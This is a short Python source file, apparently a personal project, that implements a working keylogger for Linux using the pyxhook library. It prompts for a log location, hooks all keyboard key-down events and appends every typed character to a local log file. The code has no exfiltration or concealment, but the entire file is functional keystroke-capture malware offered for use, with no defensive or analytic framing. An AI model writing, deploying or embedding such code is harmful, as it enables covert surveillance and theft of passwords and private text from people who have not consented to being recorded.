#######################################################
# Author: Arnold Vianna  
# https://github.com/arnold-vianna
# https://arnold-vianna.github.io/
#######################################################


import os
from datetime import datetime
import pyxhook

def get_log_directory():
    # Ask the user for the log directory, default to the current working directory
    return input("Enter the log directory (press Enter for default): ") or os.getcwd()

def get_log_filename():
    # Ask the user for the log filename, default to a timestamped format
    return input("Enter the log filename (press Enter for default): ") or f'{datetime.now().strftime("%d_%m_%Y_%H_%M_%S")}.log'

def main():
    # Get log directory and filename from user input
    log_directory = get_log_directory()
    log_filename = get_log_filename()

    # Combine directory and filename to create the full path
    log_file = os.path.join(log_directory, log_filename)

    # Example log entry
    example_log_entry = f"Script started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

    # Log the example entry
    with open(log_file, "a") as f:
        f.write(f"{example_log_entry}\n")

    # The logging function with {event parm}
    def OnKeyPress(event):
        with open(log_file, "a") as f:  # Open a file as f with Append (a) mode
            if event.Key == 'Return':
                f.write('\n')
            else:
                f.write(f"{chr(event.Ascii)}")  # Write to the file and convert ascii to readable characters

    # Create a hook manager object
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress

    new_hook.HookKeyboard()  # set the hook

    try:
        new_hook.start()  # start the hook
    except KeyboardInterrupt:
        # User canceled from the command line so close the listener
        new_hook.cancel()
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = f"Error while catching events:\n  {ex}"
        pyxhook.print_err(msg)
        with open(log_file, "a") as f:
            f.write(f"\n{msg}")

if __name__ == "__main__":
    main()
